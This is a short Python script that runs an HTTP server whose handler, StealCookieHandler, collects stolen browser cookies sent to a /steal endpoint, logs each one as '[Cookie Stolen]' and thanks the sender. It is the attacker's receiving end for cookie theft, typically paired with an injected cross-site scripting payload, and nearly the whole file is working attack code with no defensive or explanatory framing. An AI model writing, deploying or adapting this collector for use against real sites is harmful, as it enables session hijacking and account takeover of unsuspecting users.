from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse


class StealCookieHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/steal'):
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            cookie = params.get('cookie', [''])[0]
            print(f"[🍪 Cookie Stolen] {cookie}")

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<h3>Cookie received. Thank you!</h3>")
        else:
            self.send_error(404)


def run(server_class=HTTPServer, handler_class=StealCookieHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[👀] Listening on http://localhost:{port}/steal ...")
    httpd.serve_forever()


if __name__ == '__main__':
    run()